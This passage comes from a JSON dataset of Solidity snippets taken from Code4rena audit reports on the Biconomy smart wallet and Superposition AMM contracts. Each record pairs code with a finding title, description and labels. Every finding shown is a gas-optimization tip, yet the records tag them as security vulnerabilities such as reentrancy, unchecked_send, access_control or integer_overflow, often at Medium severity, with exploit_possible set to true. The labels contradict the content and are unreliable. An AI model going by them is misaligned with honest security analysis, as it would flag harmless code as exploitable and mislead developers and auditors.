      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol\n\n34:           require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n\n49:           require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n\n68:           require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;08]  Splitting `require()` statements that use `&&` saves gas",
    "description": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas** *There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol 34:           require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 49:           require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.36,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n/// @audit expensive op on line 36\n37:           require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\n\n/// @audit expensive op on line 49\n50:           require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;09]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
    "description": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case. *There are 6 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol /// @audit expensive op on line 60 61:           require(_unstakeDelaySec > 0, \"must specify unstake delay\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.409,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol\n\n67:       function withdrawTo(address payable withdrawAddress, uint256 amount) public virtual onlyOwner {\n\n99:       function withdrawStake(address payable withdrawAddress) external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[G&#x2011;10]  Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost *There are 4 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol 67:       function withdrawTo(address payable withdrawAddress, uint256 amount) public virtual onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.286,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol\n\n/// @audit data - (valid but excluded finding)\n80        function execTransactionFromModuleReturnData(\n81            address to,\n82            uint256 value,\n83            bytes memory data,\n84            Enum.Operation operation\n85:       ) public returns (bool success, bytes memory returnData) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[G&#x2011;01]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
    "description": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved *There are 4 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.385,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n468:          for (uint i = 0; i < dest.length;) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[G&#x2011;02]  `<array>.length` should not be looked up in every loop of a `for`-loop",
    "description": "The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**) Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.171,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n/// @audit (valid but excluded finding)\n36:           require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\n\n/// @audit (valid but excluded finding)\n37:           require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\n\n/// @audit (valid but excluded finding)\n49:           require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\n\n/// @audit (valid but excluded finding)\n50:           require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n\n/// @audit (valid but excluded finding)\n66:           require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n\n/// @audit (valid but excluded finding)\n107:          require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n\n/// @audit (valid but excluded finding)\n108:          require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n\n/// @audit (valid but excluded finding)\n109:          require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G&#x2011;03]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
    "description": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas** *There are 13 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol /// @audit (valid but excluded finding) 27:           require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "[G&#x2011;04]  Using `bool`s for storage incurs overhead",
    "description": "// Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.377,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n\n/// @audit (valid but excluded finding)\n61:           require(_unstakeDelaySec > 0, \"must specify unstake delay\");\n\n/// @audit (valid but excluded finding)\n64:           require(stake > 0, \"no stake specified\");\n\n/// @audit (valid but excluded finding)\n99:           require(stake > 0, \"No stake to withdraw\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[G&#x2011;05]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
    "description": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs. *There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol /// @audit (valid but excluded finding) 61:           require(_unstakeDelaySec > 0, \"must specify unstake delay\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.404,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol\n\n/// @audit (valid but excluded finding)\n20:       function _getImplementation() internal view returns (address _imp) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;06]  `internal` functions not called by the contract should be removed to save deployment gas",
    "description": "If the functions are required by an interface, the contract should inherit from that interface and use the `override` keyword *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol /// @audit (valid but excluded finding) 20:       function _getImplementation() internal view returns (address _imp) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.203,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n/// @audit (valid but excluded finding)\n74:           for (uint256 i = 0; i < opslen; i++) {\n\n/// @audit (valid but excluded finding)\n80:           for (uint256 i = 0; i < opslen; i++) {\n\n/// @audit (valid but excluded finding)\n100:          for (uint256 i = 0; i < opasLen; i++) {\n\n/// @audit (valid but excluded finding)\n107:          for (uint256 a = 0; a < opasLen; a++) {\n\n/// @audit (valid but excluded finding)\n112:              for (uint256 i = 0; i < opslen; i++) {\n\n/// @audit (valid but excluded finding)\n114:                  opIndex++;\n\n/// @audit (valid but excluded finding)\n128:          for (uint256 a = 0; a < opasLen; a++) {\n\n/// @audit (valid but excluded finding)\n134:              for (uint256 i = 0; i < opslen; i++) {\n\n/// @audit (valid but excluded finding)\n136:                  opIndex++;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[G&#x2011;07]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
    "description": "Saves **5 gas per loop** *There are 11 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit (valid but excluded finding) 74:           for (uint256 i = 0; i < opslen; i++) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 31,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.907,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol\n\n/// @audit (valid but excluded finding)\n12:       string public constant NAME = \"Default Callback Handler\";\n\n/// @audit (valid but excluded finding)\n13:       string public constant VERSION = \"1.0.0\";\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;08]  Using `private` rather than `public` for constants, saves gas",
    "description": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table *There are 4 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol /// @audit (valid but excluded finding) 12:       string public constant NAME = \"Default Callback Handler\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.299,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol\n\n/// @audit (valid but excluded finding)\n36:           return (a & b) + (a ^ b) / 2;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[G&#x2011;09]  Division by two should use bit shifting",
    "description": "`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol /// @audit (valid but excluded finding) 36:           return (a & b) + (a ^ b) / 2;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.161,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n77:           require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n\n/// @audit (valid but excluded finding)\n83:           require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n\n/// @audit (valid but excluded finding)\n89:           require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n\n/// @audit (valid but excluded finding)\n110:          require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n\n/// @audit (valid but excluded finding)\n121:          require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n\n/// @audit (valid but excluded finding)\n128:          require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n\n/// @audit (valid but excluded finding)\n167:          require(owner == address(0), \"Already initialized\");\n\n/// @audit (valid but excluded finding)\n168:          require(address(_entryPoint) == address(0), \"Already initialized\");\n\n/// @audit (valid but excluded finding)\n169:          require(_owner != address(0),\"Invalid owner\");\n\n/// @audit (valid but excluded finding)\n170:          require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n\n/// @audit (valid but excluded finding)\n171:          require(_handler != address(0), \"Invalid Entrypoint\");\n\n/// @audit (valid but excluded finding)\n224:          require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n\n/// @audit (valid but excluded finding)\n232:              require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n\n/// @audit (valid but excluded finding)\n262:              require(success, \"BSA011\");\n\n/// @audit (valid but excluded finding)\n265:              require(transferToken(gasToken, receiver, payment), \"BSA012\");\n\n/// @audit (valid but excluded finding)\n286:              require(success, \"BSA011\");\n\n/// @audit (valid but excluded finding)\n289:              require(transferToken(gasToken, receiver, payment), \"BSA012\");\n\n/// @audit (valid but excluded finding)\n322:                  require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n/// @audit (valid but excluded finding)\n325:                  require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n/// @audit (valid but excluded finding)\n333:                  require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n/// @audit (valid but excluded finding)\n342:                  require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n\n/// @audit (valid but excluded finding)\n348:              require(_signer == owner, \"INVALID_SIGNATURE\");\n\n/// @audit (valid but excluded finding)\n351:              require(_signer == owner, \"INVALID_SIGNATURE\");\n\n/// @audit (valid but excluded finding)\n450:          require(dest != address(0), \"this action will burn your funds\");\n\n/// @audit (valid but excluded finding)\n452:          require(success,\"transfer failed\");\n\n/// @audit (valid but excluded finding)\n467:          require(dest.length == func.length, \"wrong array lengths\");\n\n/// @audit (valid but excluded finding)\n491:          require(success, \"Userop Failed\");\n\n/// @audit (valid but excluded finding)\n495:          require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n\n/// @audit (valid but excluded finding)\n502:          require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n\n/// @audit (valid but excluded finding)\n511:          require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Medium",
    "title": "[G&#x2011;10]  Use custom errors rather than `revert()`/`require()` strings to save gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas *There are 69 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit (valid but excluded finding) 36:           require(beneficiary != address(0), \"AA90 invalid beneficiary\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 94,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n455:      function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n\n/// @audit (valid but excluded finding)\n460:      function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n\n/// @audit (valid but excluded finding)\n465:      function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n\n/// @audit (valid but excluded finding)\n489:      function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[G&#x2011;11]  Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost *There are 7 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol /// @audit (valid but excluded finding)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.719,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n36:     mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-1\"></a>[GAS-1] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 36:     mapping(address => mapping(address => bool)) public isApprovedForAll; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.123,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n4: import \"./ISeawaterExecutors.sol\";\n\n6: import \"./ISeawaterAMM.sol\";\n\n12: bytes32 constant EXECUTOR_SWAP_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap\")) - 1);\n\n15: bytes32 constant EXECUTOR_SWAP_PERMIT2_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2\")) - 1);\n\n18: bytes32 constant EXECUTOR_QUOTE_SLOT = bytes32(uint256(keccak256(\"seawater.impl.quote\")) - 1);\n\n21: bytes32 constant EXECUTOR_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.position\")) - 1);\n\n24: bytes32 constant EXECUTOR_UPDATE_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.update_position\")) - 1);\n\n27: bytes32 constant EXECUTOR_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.impl.admin\")) - 1);\n\n30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n33: bytes32 constant PROXY_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.role.proxy.admin\")) - 1);\n\n161:         address /* token */,\n\n162:         uint256 /* sqrtPriceX96 */,\n\n163:         uint32 /* fee */,\n\n164:         uint8 /* tickSpacing */,\n\n165:         uint128 /* maxLiquidityPerTick */\n\n172:         address /* pool */,\n\n173:         uint128 /* amount0 */,\n\n174:         uint128 /* amount1 */,\n\n175:         address /* recipient */\n\n182:         address /* pool */,\n\n183:         bool /* enabled */\n\n190:         address /* enabler */,\n\n191:         bool /* enabled */\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n231:         address /* pool */,\n\n232:         bool /* zeroForOne */,\n\n233:         int256 /* amount */,\n\n234:         uint256 /* priceLimit */,\n\n235:         uint256 /* nonce */,\n\n236:         uint256 /* deadline */,\n\n237:         uint256 /* maxAmount */,\n\n238:         bytes memory /* sig */\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n250:         address /* from */,\n\n251:         address /* to */,\n\n252:         uint256 /* amount */,\n\n253:         uint256 /* minOut */,\n\n254:         uint256 /* nonce */,\n\n255:         uint256 /* deadline */,\n\n256:         bytes memory /* sig */\n\n276:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n299:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n363:         uint256 /* id */,\n\n364:         address /* from */,\n\n365:         address /* to */\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n377:         address /* pool */,\n\n378:         uint256 /* id */\n\n385:         address /* pool */,\n\n386:         uint256 /* id */\n\n393:         address /* pool */,\n\n394:         uint256 /* id */\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n406:         address /* pool */,\n\n407:         uint256 /* position */\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n439:         address /* pool */,\n\n440:         uint256 /* id */,\n\n441:         address /* recipient */\n\n448:         address[] memory /* pools */,\n\n449:         uint256[] memory /* ids */\n\n456:         address /* pool */,\n\n457:         uint256 /* id */,\n\n458:         int128 /* delta */\n\n465:         address /* pool */,\n\n466:         uint256 /* id */,\n\n467:         uint256 /* amount0Min */,\n\n468:         uint256 /* amount1Min */,\n\n469:         uint256 /* amount0Desired */,\n\n470:         uint256 /* amount1Desired */\n\n477:         uint256 /* id */,\n\n478:         uint256 /* amount0Min */,\n\n479:         uint256 /* amount1Min */,\n\n480:         uint256 /* amount0Max */,\n\n481:         uint256 /* amount1Max */\n\n488:         address /* token */,\n\n489:         uint256 /* id */,\n\n490:         uint256 /* amount0Min */,\n\n491:         uint256 /* amount1Min */,\n\n492:         uint256 /* nonce0 */,\n\n493:         uint256 /* deadline0 */,\n\n494:         uint256 /* amount0Max */,\n\n495:         bytes memory /* sig0 */,\n\n496:         uint256 /* nonce1 */,\n\n497:         uint256 /* deadline1 */,\n\n498:         uint256 /* amount1Max */,\n\n499:         bytes memory /* sig1 */\n\n",
    "vulnerability_label": 1,
